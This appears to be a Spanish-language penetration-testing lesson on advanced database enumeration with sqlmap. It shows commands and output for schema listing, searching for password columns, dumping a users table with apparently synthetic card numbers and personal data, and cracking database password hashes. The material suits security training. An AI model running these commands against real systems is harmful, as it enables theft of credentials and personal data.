# Advanced Database Enumeration

Ahora que hemos cubierto los conceptos básicos de la enumeración de la base de datos con SQLMAP, cubriremos técnicas más avanzadas para enumerar los datos de interés aún más en esta sección.

---

# **Enumeración de esquema de DB**

Si quisiéramos recuperar la estructura de todas las tablas para que podamos tener una visión general completa de la arquitectura de la base de datos, podríamos usar el interruptor`--schema`:

Enumeración avanzada de la base de datos

```
xnoxos@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --schema...SNIP...
Database: master
Table: log
[3 columns]
+--------+--------------+
| Column | Type         |
+--------+--------------+
| date   | datetime     |
| agent  | varchar(512) |
| id     | int(11)      |
+--------+--------------+

Database: owasp10
Table: accounts
[4 columns]
+-------------+---------+
| Column      | Type    |
+-------------+---------+
| cid         | int(11) |
| mysignature | text    |
| password    | text    |
| username    | text    |
+-------------+---------+
...
Database: testdb
Table: data
[2 columns]
+---------+---------+
| Column  | Type    |
+---------+---------+
| content | blob    |
| id      | int(11) |
+---------+---------+

Database: testdb
Table: users
[3 columns]
+---------+---------------+
| Column  | Type          |
+---------+---------------+
| id      | int(11)       |
| name    | varchar(500)  |
| surname | varchar(1000) |
+---------+---------------+

```

---

# **Buscando datos**

Al tratar con estructuras de bases de datos complejas con numerosas tablas y columnas, podemos buscar bases de datos, tablas y columnas de interés, utilizando el`--search`opción. Esta opción nos permite buscar nombres de identificadores utilizando el`LIKE`operador. Por ejemplo, si estamos buscando todos los nombres de la tabla que contienen la palabra clave`user`, podemos ejecutar SQLMAP de la siguiente manera:

Enumeración avanzada de la base de datos

```
xnoxos@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --search -T user...SNIP...
[14:24:19] [INFO] searching tables LIKE 'user'
Database: testdb
[1 table]
+-----------------+
| users           |
+-----------------+

Database: master
[1 table]
+-----------------+
| users           |
+-----------------+

Database: information_schema
[1 table]
+-----------------+
| USER_PRIVILEGES |
+-----------------+

Database: mysql
[1 table]
+-----------------+
| user            |
+-----------------+

do you want to dump found table(s) entries? [Y/n]
...SNIP...

```

En el ejemplo anterior, podemos detectar inmediatamente un par de objetivos de recuperación de datos interesantes basados en estos resultados de búsqueda. También podríamos haber tratado de buscar todos los nombres de columnas en función de una palabra clave específica (por ejemplo,`pass`):

Enumeración avanzada de la base de datos

```
xnoxos@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --search -C pass...SNIP...
columns LIKE 'pass' were found in the following databases:
Database: owasp10
Table: accounts
[1 column]
+----------+------+
| Column   | Type |
+----------+------+
| password | text |
+----------+------+

Database: master
Table: users
[1 column]
+----------+--------------+
| Column   | Type         |
+----------+--------------+
| password | varchar(512) |
+----------+--------------+

Database: mysql
Table: user
[1 column]
+----------+----------+
| Column   | Type     |
+----------+----------+
| Password | char(41) |
+----------+----------+

Database: mysql
Table: servers
[1 column]
+----------+----------+
| Column   | Type     |
+----------+----------+
| Password | char(64) |
+----------+----------+

```

---

# **Enumeración de contraseña y agrietamiento**

Una vez que identificamos una tabla que contiene contraseñas (por ejemplo,`master.users`), podemos recuperar esa tabla con el`-T`Opción, como se mostró anteriormente:

Enumeración avanzada de la base de datos

```
xnoxos@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --dump -D master -T users...SNIP...
[14:31:41] [INFO] fetching columns for table 'users' in database 'master'
[14:31:41] [INFO] fetching entries for table 'users' in database 'master'
[14:31:41] [INFO] recognized possible password hashes in column 'password'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] N

do you want to crack them via a dictionary-based attack? [Y/n/q] Y

[14:31:41] [INFO] using hash method 'sha1_generic_passwd'
what dictionary do you want to use?
[1] default dictionary file '/usr/local/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files
> 1
[14:31:41] [INFO] using default dictionary
do you want to use common password suffixes? (slow!) [y/N] N

[14:31:41] [INFO] starting dictionary-based cracking (sha1_generic_passwd)
[14:31:41] [INFO] starting 8 processes
[14:31:41] [INFO] cracked password '05adrian' for hash '70f361f8a1c9035a1d972a209ec5e8b726d1055e'
[14:31:41] [INFO] cracked password '1201Hunt' for hash 'df692aa944eb45737f0b3b3ef906f8372a3834e9'
...SNIP...
[14:31:47] [INFO] cracked password 'Zc1uowqg6' for hash '0ff476c2676a2e5f172fe568110552f2e910c917'
Database: master
Table: users
[32 entries]
+----+------------------+-------------------+-----------------------------+--------------+------------------------+-------------------+-------------------------------------------------------------+---------------------------------------------------+
| id | cc               | name              | email                       | phone        | address                | birthday          | password                                                    | occupation                                        |
+----+------------------+-------------------+-----------------------------+--------------+------------------------+-------------------+-------------------------------------------------------------+---------------------------------------------------+
| 1  | 5387278172507117 | Maynard Rice      | MaynardMRice@yahoo.com      | 281-559-0172 | 1698 Bird Spring Lane  | March 1 1958      | 9a0f092c8d52eaf3ea423cef8485702ba2b3deb9 (3052)             | Linemen                                           |
| 2  | 4539475107874477 | Julio Thomas      | JulioWThomas@gmail.com      | 973-426-5961 | 1207 Granville Lane    | February 14 1972  | 10945aa229a6d569f226976b22ea0e900a1fc219 (taqris)           | Agricultural product sorter                       |
| 3  | 4716522746974567 | Kenneth Maloney   | KennethTMaloney@gmail.com   | 954-617-0424 | 2811 Kenwood Place     | May 14 1989       | a5e68cd37ce8ec021d5ccb9392f4980b3c8b3295 (hibiskus)         | General and operations manager                    |
| 4  | 4929811432072262 | Gregory Stumbaugh | GregoryBStumbaugh@yahoo.com | 410-680-5653 | 1641 Marshall Street   | May 7 1936        | b7fbde78b81f7ad0b8ce0cc16b47072a6ea5f08e (spiderpig8574376) | Foreign language interpreter                      |
| 5  | 4539646911423277 | Bobby Granger     | BobbyJGranger@gmail.com     | 212-696-1812 | 4510 Shinn Street      | December 22 1939  | aed6d83bab8d9234a97f18432cd9a85341527297 (1955chev)         | Medical records and health information technician |
| 6  | 5143241665092174 | Kimberly Wright   | KimberlyMWright@gmail.com   | 440-232-3739 | 3136 Ralph Drive       | June 18 1972      | d642ff0feca378666a8727947482f1a4702deba0 (Enizoom1609)      | Electrologist                                     |
| 7  | 5503989023993848 | Dean Harper       | DeanLHarper@yahoo.com       | 440-847-8376 | 3766 Flynn Street      | February 3 1974   | 2b89b43b038182f67a8b960611d73e839002fbd9 (raided)           | Store detective                                   |
| 8  | 4556586478396094 | Gabriela Waite    | GabrielaRWaite@msn.com      | 732-638-1529 | 2459 Webster Street    | December 24 1965  | f5eb0fbdd88524f45c7c67d240a191163a27184b (ssival47)         | Telephone station installer                       |

```

Podemos ver en el ejemplo anterior que SQLMAP tiene capacidades automáticas de agrietamiento de hashes con contraseña. Al recuperar cualquier valor que se asemeja a un formato hash conocido, SQLMAP nos impide realizar un ataque basado en el diccionario contra los hashes encontrados.

Los ataques de grietas hash se realizan de manera múltiple, según la cantidad de núcleos disponibles en la computadora del usuario. Actualmente, existe un soporte implementado para descifrar 31 tipos diferentes de algoritmos hash, con un diccionario incluido que contiene 1,4 millones de entradas (compiladas a lo largo de los años con las entradas más comunes que aparecen en fugas de contraseña disponibles públicamente). Por lo tanto, si un hash de contraseña no se elige al azar, existe una buena probabilidad de que SQLMAP lo descifra automáticamente.

---

# **DB Usuarios Enumeración de contraseña y agrietamiento**

Además de las credenciales de usuario que se encuentran en las tablas de DB, también podemos intentar volcar el contenido de tablas del sistema que contienen credenciales específicas de la base de datos (por ejemplo, credenciales de conexión). Para aliviar todo el proceso, SQLMAP tiene un interruptor especial`--passwords`diseñado especialmente para tal tarea:

Enumeración avanzada de la base de datos

```
xnoxos@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --passwords --batch...SNIP...
[14:25:20] [INFO] fetching database users password hashes
[14:25:20] [WARNING] something went wrong with full UNION technique (could be because of limitation on retrieved number of entries). Falling back to partial UNION technique
[14:25:20] [INFO] retrieved: 'root'
[14:25:20] [INFO] retrieved: 'root'
[14:25:20] [INFO] retrieved: 'root'
[14:25:20] [INFO] retrieved: 'debian-sys-maint'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] N

do you want to perform a dictionary-based attack against retrieved password hashes? [Y/n/q] Y

[14:25:20] [INFO] using hash method 'mysql_passwd'
what dictionary do you want to use?
[1] default dictionary file '/usr/local/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files
> 1
[14:25:20] [INFO] using default dictionary
do you want to use common password suffixes? (slow!) [y/N] N

[14:25:20] [INFO] starting dictionary-based cracking (mysql_passwd)
[14:25:20] [INFO] starting 8 processes
[14:25:26] [INFO] cracked password 'testpass' for user 'root'
database management system users password hashes:

[*] debian-sys-maint [1]:
    password hash: *6B2C58EABD91C1776DA223B088B601604F898847
[*] root [1]:
    password hash: *00E247AC5F9AF26AE0194B41E1E769DEE1429A29
    clear-text password: testpass

[14:25:28] [INFO] fetched data logged to text files under '/home/user/.local/share/sqlmap/output/www.example.com'

[*] ending @ 14:25:28 /2020-09-18/

```

Consejo: el interruptor '-All' en combinación con el interruptor '-batch', automáticamente (g) hará todo el proceso de enumeración en el objetivo en sí y proporcionará todos los detalles de enumeración.

Básicamente, esto significa que todo accesible se recuperará, potencialmente funcionando durante mucho tiempo. Tendremos que encontrar los datos de interés en los archivos de salida manualmente.